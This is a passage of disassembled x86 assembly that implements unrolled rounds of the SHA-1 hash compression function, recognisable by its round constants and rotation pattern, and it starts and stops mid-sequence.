rol ecx, 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
xor edx, dword [var_4h]
mov edi, dword [var_2ch]
mov dword [var_38h], edi
mov ebx, dword [var_18h]
xor dword [var_38h], ebx
mov edi, dword [var_144h]
xor dword [var_38h], edi
mov ebx, dword [var_13ch]
xor dword [var_38h], ebx
rol dword [var_38h], 1
mov ebx, dword [var_38h]
mov edi, dword [var_ch]
mov dword [edi + 0x24], ebx
add edx, ebx
mov eax, esi
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
xor edx, dword [var_15ch]
xor edx, ecx
mov edi, dword [var_30h]
mov dword [var_3ch], edi
mov ebx, dword [var_1ch]
xor dword [var_3ch], ebx
mov edi, dword [var_148h]
xor dword [var_3ch], edi
mov ebx, dword [var_140h]
xor dword [var_3ch], ebx
rol dword [var_3ch], 1
mov ebx, dword [var_3ch]
mov edi, dword [var_ch]
mov dword [edi + 0x28], ebx
add edx, ebx
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
xor edx, esi
xor edx, dword [var_15ch]
mov edi, dword [var_34h]
mov dword [var_40h], edi
mov ebx, dword [var_20h]
xor dword [var_40h], ebx
mov edi, dword [var_14ch]
xor dword [var_40h], edi
mov ebx, dword [var_144h]
xor dword [var_40h], ebx
rol dword [var_40h], 1
mov ebx, dword [var_40h]
mov edi, dword [var_ch]
mov dword [edi + 0x2c], ebx
add edx, ebx
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
xor edx, esi
mov edi, dword [var_38h]
mov dword [var_44h], edi
mov ebx, dword [var_24h]
xor dword [var_44h], ebx
mov edi, dword [var_150h]
xor dword [var_44h], edi
mov ebx, dword [var_148h]
xor dword [var_44h], ebx
rol dword [var_44h], 1
mov ebx, dword [var_44h]
mov edi, dword [var_ch]
mov dword [edi + 0x30], ebx
add edx, ebx
mov eax, ecx
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
xor edx, dword [var_4h]
xor edx, dword [var_8h]
mov edi, dword [var_3ch]
mov dword [var_48h], edi
mov ebx, dword [var_28h]
xor dword [var_48h], ebx
mov edi, dword [var_154h]
xor dword [var_48h], edi
mov ebx, dword [var_14ch]
xor dword [var_48h], ebx
rol dword [var_48h], 1
mov ebx, dword [var_48h]
mov edi, dword [var_ch]
mov dword [edi + 0x34], ebx
add edx, ebx
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
xor edx, dword [var_4h]
mov edi, dword [var_40h]
mov dword [var_4ch], edi
mov ebx, dword [var_2ch]
xor dword [var_4ch], ebx
mov edi, dword [var_14h]
xor dword [var_4ch], edi
mov ebx, dword [var_150h]
xor dword [var_4ch], ebx
rol dword [var_4ch], 1
mov ebx, dword [var_4ch]
mov edi, dword [var_ch]
mov dword [edi + 0x38], ebx
add edx, ebx
mov eax, esi
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
xor edx, dword [var_15ch]
xor edx, ecx
mov edi, dword [var_44h]
mov dword [var_50h], edi
mov ebx, dword [var_30h]
xor dword [var_50h], ebx
mov edi, dword [var_18h]
xor dword [var_50h], edi
mov ebx, dword [var_154h]
xor dword [var_50h], ebx
rol dword [var_50h], 1
mov ebx, dword [var_50h]
mov edi, dword [var_ch]
mov dword [edi + 0x3c], ebx
add edx, ebx
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
xor edx, esi
xor edx, dword [var_15ch]
mov edi, dword [var_48h]
mov dword [var_54h], edi
mov ebx, dword [var_34h]
xor dword [var_54h], ebx
mov edi, dword [var_1ch]
xor dword [var_54h], edi
mov ebx, dword [var_14h]
xor dword [var_54h], ebx
rol dword [var_54h], 1
mov edi, dword [var_54h]
mov dword [0x804cce0], edi
add edx, edi
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
xor edx, esi
mov ebx, dword [var_4ch]
mov dword [var_58h], ebx
mov edi, dword [var_38h]
xor dword [var_58h], edi
mov ebx, dword [var_20h]
xor dword [var_58h], ebx
mov edi, dword [var_18h]
xor dword [var_58h], edi
rol dword [var_58h], 1
mov edi, dword [var_58h]
mov ebx, dword [var_ch]
mov dword [ebx + 4], edi
add edx, edi
mov eax, ecx
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
xor edx, dword [var_4h]
xor edx, dword [var_8h]
mov ebx, dword [var_50h]
mov dword [var_5ch], ebx
mov edi, dword [var_3ch]
xor dword [var_5ch], edi
mov ebx, dword [var_24h]
xor dword [var_5ch], ebx
mov edi, dword [var_1ch]
xor dword [var_5ch], edi
rol dword [var_5ch], 1
mov edi, dword [var_5ch]
mov ebx, dword [var_ch]
mov dword [ebx + 8], edi
add edx, edi
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
xor edx, dword [var_4h]
mov ebx, dword [var_54h]
mov dword [var_60h], ebx
mov edi, dword [var_40h]
xor dword [var_60h], edi
mov ebx, dword [var_28h]
xor dword [var_60h], ebx
mov edi, dword [var_20h]
xor dword [var_60h], edi
rol dword [var_60h], 1
mov edi, dword [var_60h]
mov ebx, dword [var_ch]
mov dword [ebx + 0xc], edi
add edx, edi
mov eax, esi
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
xor edx, dword [var_15ch]
xor edx, ecx
mov ebx, dword [var_58h]
mov dword [var_64h], ebx
mov edi, dword [var_44h]
xor dword [var_64h], edi
mov ebx, dword [var_2ch]
xor dword [var_64h], ebx
mov edi, dword [var_24h]
xor dword [var_64h], edi
rol dword [var_64h], 1
mov edi, dword [var_64h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x10], edi
add edx, edi
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
xor edx, esi
xor edx, dword [var_15ch]
mov ebx, dword [var_5ch]
mov dword [var_68h], ebx
mov edi, dword [var_48h]
xor dword [var_68h], edi
mov ebx, dword [var_30h]
xor dword [var_68h], ebx
mov edi, dword [var_28h]
xor dword [var_68h], edi
rol dword [var_68h], 1
mov edi, dword [var_68h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x14], edi
add edx, edi
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
xor edx, esi
mov ebx, dword [var_60h]
mov dword [var_6ch], ebx
mov edi, dword [var_4ch]
xor dword [var_6ch], edi
mov ebx, dword [var_34h]
xor dword [var_6ch], ebx
mov edi, dword [var_2ch]
xor dword [var_6ch], edi
rol dword [var_6ch], 1
mov edi, dword [var_6ch]
mov ebx, dword [var_ch]
mov dword [ebx + 0x18], edi
add edx, edi
mov eax, ecx
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
xor edx, dword [var_4h]
xor edx, dword [var_8h]
mov ebx, dword [var_64h]
mov dword [var_70h], ebx
mov edi, dword [var_50h]
xor dword [var_70h], edi
mov ebx, dword [var_38h]
xor dword [var_70h], ebx
mov edi, dword [var_30h]
xor dword [var_70h], edi
rol dword [var_70h], 1
mov edi, dword [var_70h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x1c], edi
add edx, edi
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax + 0x6ed9eba1]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
or edx, ecx
and edx, dword [var_4h]
mov eax, dword [var_15ch]
and eax, ecx
or edx, eax
mov ebx, dword [var_68h]
mov dword [var_74h], ebx
mov edi, dword [var_54h]
xor dword [var_74h], edi
mov ebx, dword [var_3ch]
xor dword [var_74h], ebx
mov edi, dword [var_34h]
xor dword [var_74h], edi
rol dword [var_74h], 1
mov edi, dword [var_74h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x20], edi
add edx, edi
mov eax, esi
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
or edx, dword [var_15ch]
and edx, ecx
mov eax, esi
and eax, dword [var_15ch]
or edx, eax
mov ebx, dword [var_6ch]
mov dword [var_78h], ebx
mov edi, dword [var_58h]
xor dword [var_78h], edi
mov ebx, dword [var_40h]
xor dword [var_78h], ebx
mov edi, dword [var_38h]
xor dword [var_78h], edi
rol dword [var_78h], 1
mov edi, dword [var_78h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x24], edi
add edx, edi
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
or edx, esi
and edx, dword [var_15ch]
mov eax, dword [var_8h]
and eax, esi
or edx, eax
mov ebx, dword [var_70h]
mov dword [var_7ch], ebx
mov edi, dword [var_5ch]
xor dword [var_7ch], edi
mov ebx, dword [var_44h]
xor dword [var_7ch], ebx
mov edi, dword [var_3ch]
xor dword [var_7ch], edi
rol dword [var_7ch], 1
mov edi, dword [var_7ch]
mov ebx, dword [var_ch]
mov dword [ebx + 0x28], edi
add edx, edi
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
or edx, dword [var_8h]
and edx, esi
mov eax, dword [var_4h]
and eax, dword [var_8h]
or edx, eax
mov ebx, dword [var_74h]
mov dword [var_80h], ebx
mov edi, dword [var_60h]
xor dword [var_80h], edi
mov ebx, dword [var_48h]
xor dword [var_80h], ebx
mov edi, dword [var_40h]
xor dword [var_80h], edi
rol dword [var_80h], 1
mov edi, dword [var_80h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x2c], edi
add edx, edi
mov eax, ecx
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
or edx, dword [var_4h]
and edx, dword [var_8h]
mov eax, ecx
and eax, dword [var_4h]
or edx, eax
mov ebx, dword [var_78h]
mov dword [var_84h], ebx
mov edi, dword [var_64h]
xor dword [var_84h], edi
mov ebx, dword [var_4ch]
xor dword [var_84h], ebx
mov edi, dword [var_44h]
xor dword [var_84h], edi
rol dword [var_84h], 1
mov edi, dword [var_84h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x30], edi
add edx, edi
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
or edx, ecx
and edx, dword [var_4h]
mov eax, dword [var_15ch]
and eax, ecx
or edx, eax
mov ebx, dword [var_7ch]
mov dword [var_88h], ebx
mov edi, dword [var_68h]
xor dword [var_88h], edi
mov ebx, dword [var_50h]
xor dword [var_88h], ebx
mov edi, dword [var_48h]
xor dword [var_88h], edi
rol dword [var_88h], 1
mov edi, dword [var_88h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x34], edi
add edx, edi
mov eax, esi
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
or edx, dword [var_15ch]
and edx, ecx
mov eax, esi
and eax, dword [var_15ch]
or edx, eax
mov ebx, dword [var_80h]
mov dword [var_8ch], ebx
mov edi, dword [var_6ch]
xor dword [var_8ch], edi
mov ebx, dword [var_54h]
xor dword [var_8ch], ebx
mov edi, dword [var_4ch]
xor dword [var_8ch], edi
rol dword [var_8ch], 1
mov edi, dword [var_8ch]
mov ebx, dword [var_ch]
mov dword [ebx + 0x38], edi
add edx, edi
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
or edx, esi
and edx, dword [var_15ch]
mov eax, dword [var_8h]
and eax, esi
or edx, eax
mov ebx, dword [var_84h]
mov dword [var_90h], ebx
mov edi, dword [var_70h]
xor dword [var_90h], edi
mov ebx, dword [var_58h]
xor dword [var_90h], ebx
mov edi, dword [var_50h]
xor dword [var_90h], edi
rol dword [var_90h], 1
mov edi, dword [var_90h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x3c], edi
add edx, edi
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
or edx, dword [var_8h]
and edx, esi
mov eax, dword [var_4h]
and eax, dword [var_8h]
or edx, eax
mov ebx, dword [var_88h]
mov dword [var_94h], ebx
mov edi, dword [var_74h]
xor dword [var_94h], edi
mov ebx, dword [var_5ch]
xor dword [var_94h], ebx
mov edi, dword [var_54h]
xor dword [var_94h], edi
rol dword [var_94h], 1
mov ebx, dword [var_94h]
mov dword [0x804cce0], ebx
add edx, ebx
mov eax, ecx
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
or edx, dword [var_4h]
and edx, dword [var_8h]
mov eax, ecx
and eax, dword [var_4h]
or edx, eax
mov edi, dword [var_8ch]
mov dword [var_98h], edi
mov ebx, dword [var_78h]
xor dword [var_98h], ebx
mov edi, dword [var_60h]
xor dword [var_98h], edi
mov ebx, dword [var_58h]
xor dword [var_98h], ebx
rol dword [var_98h], 1
mov ebx, dword [var_98h]
mov edi, dword [var_ch]
mov dword [edi + 4], ebx
add edx, ebx
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
or edx, ecx
and edx, dword [var_4h]
mov eax, dword [var_15ch]
and eax, ecx
or edx, eax
mov edi, dword [var_90h]
mov dword [var_9ch], edi
mov ebx, dword [var_7ch]
xor dword [var_9ch], ebx
mov edi, dword [var_64h]
xor dword [var_9ch], edi
mov ebx, dword [var_5ch]
xor dword [var_9ch], ebx
rol dword [var_9ch], 1
mov ebx, dword [var_9ch]
mov edi, dword [var_ch]
mov dword [edi + 8], ebx
add edx, ebx
mov eax, esi
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
or edx, dword [var_15ch]
and edx, ecx
mov eax, esi
and eax, dword [var_15ch]
or edx, eax
mov edi, dword [var_94h]
mov dword [var_a0h], edi
mov ebx, dword [var_80h]
xor dword [var_a0h], ebx
mov edi, dword [var_68h]
xor dword [var_a0h], edi
mov ebx, dword [var_60h]
xor dword [var_a0h], ebx
rol dword [var_a0h], 1
mov ebx, dword [var_a0h]
mov edi, dword [var_ch]
mov dword [edi + 0xc], ebx
add edx, ebx
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
or edx, esi
and edx, dword [var_15ch]
mov eax, dword [var_8h]
and eax, esi
or edx, eax
mov edi, dword [var_98h]
mov dword [var_a4h], edi
mov ebx, dword [var_84h]
xor dword [var_a4h], ebx
mov edi, dword [var_6ch]
xor dword [var_a4h], edi
mov ebx, dword [var_64h]
xor dword [var_a4h], ebx
rol dword [var_a4h], 1
mov ebx, dword [var_a4h]
mov edi, dword [var_ch]
mov dword [edi + 0x10], ebx
add edx, ebx
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
or edx, dword [var_8h]
and edx, esi
mov eax, dword [var_4h]
and eax, dword [var_8h]
or edx, eax
mov edi, dword [var_9ch]
mov dword [var_a8h], edi
mov ebx, dword [var_88h]
xor dword [var_a8h], ebx
mov edi, dword [var_70h]
xor dword [var_a8h], edi
mov ebx, dword [var_68h]
xor dword [var_a8h], ebx
rol dword [var_a8h], 1
mov ebx, dword [var_a8h]
mov edi, dword [var_ch]
mov dword [edi + 0x14], ebx
add edx, ebx
mov eax, ecx
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
or edx, dword [var_4h]
and edx, dword [var_8h]
mov eax, ecx
and eax, dword [var_4h]
or edx, eax
mov edi, dword [var_a0h]
mov dword [var_ach], edi
mov ebx, dword [var_8ch]
xor dword [var_ach], ebx
mov edi, dword [var_74h]
xor dword [var_ach], edi
mov ebx, dword [var_6ch]
xor dword [var_ach], ebx
rol dword [var_ach], 1
mov ebx, dword [var_ach]
mov edi, dword [var_ch]
mov dword [edi + 0x18], ebx
add edx, ebx
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
or edx, ecx
and edx, dword [var_4h]
mov eax, dword [var_15ch]
and eax, ecx
or edx, eax
mov edi, dword [var_a4h]
mov dword [var_b0h], edi
mov ebx, dword [var_90h]
xor dword [var_b0h], ebx
mov edi, dword [var_78h]
xor dword [var_b0h], edi
mov ebx, dword [var_70h]
xor dword [var_b0h], ebx
rol dword [var_b0h], 1
mov ebx, dword [var_b0h]
mov edi, dword [var_ch]
mov dword [edi + 0x1c], ebx
add edx, ebx
mov eax, esi
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
or edx, dword [var_15ch]
and edx, ecx
mov eax, esi
and eax, dword [var_15ch]
or edx, eax
mov edi, dword [var_a8h]
mov dword [var_b4h], edi
mov ebx, dword [var_94h]
xor dword [var_b4h], ebx
mov edi, dword [var_7ch]
xor dword [var_b4h], edi
mov ebx, dword [var_74h]
xor dword [var_b4h], ebx
rol dword [var_b4h], 1
mov ebx, dword [var_b4h]
mov edi, dword [var_ch]
mov dword [edi + 0x20], ebx
add edx, ebx
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
or edx, esi
and edx, dword [var_15ch]
mov eax, dword [var_8h]
and eax, esi
or edx, eax
mov edi, dword [var_ach]
mov dword [var_b8h], edi
mov ebx, dword [var_98h]
xor dword [var_b8h], ebx
mov edi, dword [var_80h]
xor dword [var_b8h], edi
mov ebx, dword [var_78h]
xor dword [var_b8h], ebx
rol dword [var_b8h], 1
mov ebx, dword [var_b8h]
mov edi, dword [var_ch]
mov dword [edi + 0x24], ebx
add edx, ebx
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
or edx, dword [var_8h]
and edx, esi
mov eax, dword [var_4h]
and eax, dword [var_8h]
or edx, eax
mov edi, dword [var_b0h]
mov dword [var_bch], edi
mov ebx, dword [var_9ch]
xor dword [var_bch], ebx
mov edi, dword [var_84h]
xor dword [var_bch], edi
mov ebx, dword [var_7ch]
xor dword [var_bch], ebx
rol dword [var_bch], 1
mov ebx, dword [var_bch]
mov edi, dword [var_ch]
mov dword [edi + 0x28], ebx
add edx, ebx
mov eax, ecx
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
or edx, dword [var_4h]
and edx, dword [var_8h]
mov eax, ecx
and eax, dword [var_4h]
or edx, eax
mov edi, dword [var_b4h]
mov dword [var_158h], edi
mov ebx, dword [var_a0h]
xor dword [var_158h], ebx
mov edi, dword [var_88h]
xor dword [var_158h], edi
mov ebx, dword [var_80h]
xor dword [var_158h], ebx
rol dword [var_158h], 1
mov ebx, dword [var_158h]
mov edi, dword [var_ch]
mov dword [edi + 0x2c], ebx
add edx, ebx
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax - 0x70e44324]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
xor edx, dword [var_4h]
mov edi, dword [var_b8h]
mov dword [var_c0h], edi
mov dword [var_c4h], edi
mov ebx, dword [var_a4h]
xor dword [var_c4h], ebx
mov edi, dword [var_8ch]
xor dword [var_c4h], edi
mov ebx, dword [var_84h]
xor dword [var_c4h], ebx
rol dword [var_c4h], 1
mov ebx, dword [var_c4h]
mov edi, dword [var_ch]
mov dword [edi + 0x30], ebx
add edx, ebx
mov eax, esi
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
xor edx, dword [var_15ch]
xor edx, ecx
mov edi, dword [var_bch]
mov dword [var_c8h], edi
mov dword [var_cch], edi
mov ebx, dword [var_a8h]
xor dword [var_cch], ebx
mov edi, dword [var_90h]
xor dword [var_cch], edi
mov ebx, dword [var_88h]
xor dword [var_cch], ebx
rol dword [var_cch], 1
mov ebx, dword [var_cch]
mov edi, dword [var_ch]
mov dword [edi + 0x34], ebx
add edx, ebx
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
xor edx, esi
xor edx, dword [var_15ch]
mov edi, dword [var_158h]
mov dword [var_d0h], edi
mov dword [var_d4h], edi
mov ebx, dword [var_ach]
xor dword [var_d4h], ebx
mov edi, dword [var_94h]
xor dword [var_d4h], edi
mov ebx, dword [var_8ch]
xor dword [var_d4h], ebx
rol dword [var_d4h], 1
mov ebx, dword [var_d4h]
mov edi, dword [var_ch]
mov dword [edi + 0x38], ebx
add edx, ebx
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
xor edx, esi
mov edi, dword [var_c4h]
mov dword [var_d8h], edi
mov ebx, dword [var_b0h]
xor dword [var_d8h], ebx
mov edi, dword [var_98h]
xor dword [var_d8h], edi
mov ebx, dword [var_90h]
xor dword [var_d8h], ebx
rol dword [var_d8h], 1
mov ebx, dword [var_d8h]
mov edi, dword [var_ch]
mov dword [edi + 0x3c], ebx
add edx, ebx
mov eax, ecx
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
xor edx, dword [var_4h]
xor edx, dword [var_8h]
mov edi, dword [var_cch]
mov dword [var_dch], edi
mov ebx, dword [var_b4h]
xor dword [var_dch], ebx
mov edi, dword [var_9ch]
xor dword [var_dch], edi
mov ebx, dword [var_94h]
xor dword [var_dch], ebx
rol dword [var_dch], 1
mov edi, dword [var_dch]
mov dword [0x804cce0], edi
add edx, edi
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
xor edx, dword [var_4h]
mov ebx, dword [var_d4h]
mov dword [var_e0h], ebx
mov edi, dword [var_c0h]
xor dword [var_e0h], edi
mov ebx, dword [var_a0h]
xor dword [var_e0h], ebx
mov edi, dword [var_98h]
xor dword [var_e0h], edi
rol dword [var_e0h], 1
mov edi, dword [var_e0h]
mov ebx, dword [var_ch]
mov dword [ebx + 4], edi
add edx, edi
mov eax, esi
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
xor edx, dword [var_15ch]
xor edx, ecx
mov ebx, dword [var_d8h]
mov dword [var_e4h], ebx
mov edi, dword [var_c8h]
xor dword [var_e4h], edi
mov ebx, dword [var_a4h]
xor dword [var_e4h], ebx
mov edi, dword [var_9ch]
xor dword [var_e4h], edi
rol dword [var_e4h], 1
mov edi, dword [var_e4h]
mov ebx, dword [var_ch]
mov dword [ebx + 8], edi
add edx, edi
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
xor edx, esi
xor edx, dword [var_15ch]
mov ebx, dword [var_dch]
mov dword [var_e8h], ebx
mov edi, dword [var_d0h]
xor dword [var_e8h], edi
mov ebx, dword [var_a8h]
xor dword [var_e8h], ebx
mov edi, dword [var_a0h]
xor dword [var_e8h], edi
rol dword [var_e8h], 1
mov edi, dword [var_e8h]
mov ebx, dword [var_ch]
mov dword [ebx + 0xc], edi
add edx, edi
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
xor edx, esi
mov ebx, dword [var_e0h]
mov dword [var_ech], ebx
mov edi, dword [var_c4h]
xor dword [var_ech], edi
mov ebx, dword [var_ach]
xor dword [var_ech], ebx
mov edi, dword [var_a4h]
xor dword [var_ech], edi
rol dword [var_ech], 1
mov edi, dword [var_ech]
mov ebx, dword [var_ch]
mov dword [ebx + 0x10], edi
add edx, edi
mov eax, ecx
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
xor edx, dword [var_4h]
xor edx, dword [var_8h]
mov ebx, dword [var_e4h]
mov dword [var_f0h], ebx
mov edi, dword [var_cch]
xor dword [var_f0h], edi
mov ebx, dword [var_b0h]
xor dword [var_f0h], ebx
mov edi, dword [var_a8h]
xor dword [var_f0h], edi
rol dword [var_f0h], 1
mov edi, dword [var_f0h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x14], edi
add edx, edi
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
xor edx, dword [var_4h]
mov ebx, dword [var_e8h]
mov dword [var_f4h], ebx
mov edi, dword [var_d4h]
xor dword [var_f4h], edi
mov ebx, dword [var_b4h]
xor dword [var_f4h], ebx
mov edi, dword [var_ach]
xor dword [var_f4h], edi
rol dword [var_f4h], 1
mov edi, dword [var_f4h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x18], edi
add edx, edi
mov eax, esi
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_8h], eax
rol dword [var_15ch], 0x1e
mov edx, esi
xor edx, dword [var_15ch]
xor edx, ecx
mov ebx, dword [var_ech]
mov dword [var_f8h], ebx
mov edi, dword [var_d8h]
xor dword [var_f8h], edi
mov ebx, dword [var_c0h]
xor dword [var_f8h], ebx
mov edi, dword [var_b0h]
xor dword [var_f8h], edi
rol dword [var_f8h], 1
mov edi, dword [var_f8h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x1c], edi
add edx, edi
mov eax, dword [var_8h]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_4h], eax
rol esi, 0x1e
mov edx, dword [var_8h]
xor edx, esi
xor edx, dword [var_15ch]
mov ebx, dword [var_f0h]
mov dword [var_fch], ebx
mov edi, dword [var_dch]
xor dword [var_fch], edi
mov ebx, dword [var_c8h]
xor dword [var_fch], ebx
mov edi, dword [var_b4h]
xor dword [var_fch], edi
rol dword [var_fch], 1
mov edi, dword [var_fch]
mov ebx, dword [var_ch]
mov dword [ebx + 0x20], edi
add edx, edi
mov eax, dword [var_4h]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add ecx, eax
rol dword [var_8h], 0x1e
mov edx, dword [var_4h]
xor edx, dword [var_8h]
xor edx, esi
mov ebx, dword [var_f4h]
mov dword [var_100h], ebx
mov edi, dword [var_e0h]
xor dword [var_100h], edi
mov ebx, dword [var_d0h]
xor dword [var_100h], ebx
mov edi, dword [var_c0h]
xor dword [var_100h], edi
rol dword [var_100h], 1
mov edi, dword [var_100h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x24], edi
add edx, edi
mov eax, ecx
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add dword [var_15ch], eax
rol dword [var_4h], 0x1e
mov edx, ecx
xor edx, dword [var_4h]
xor edx, dword [var_8h]
mov ebx, dword [var_f8h]
mov dword [var_104h], ebx
mov edi, dword [var_e4h]
xor dword [var_104h], edi
mov ebx, dword [var_c4h]
xor dword [var_104h], ebx
mov edi, dword [var_c8h]
xor dword [var_104h], edi
rol dword [var_104h], 1
mov edi, dword [var_104h]
mov ebx, dword [var_ch]
mov dword [ebx + 0x28], edi
add edx, edi
mov eax, dword [var_15ch]
rol eax, 5
lea eax, [edx + eax - 0x359d3e2a]
add esi, eax
rol ecx, 0x1e
mov edx, dword [var_15ch]
xor edx, ecx
xor edx, dword [var_4h]
mov ebx, dword [var_fch]
xor ebx, dword [var_e8h]
mov edi, dword [var_cch]
xor ebx, edi
mov edi, dword [var_d0h]
xor ebx, edi
rol ebx, 1
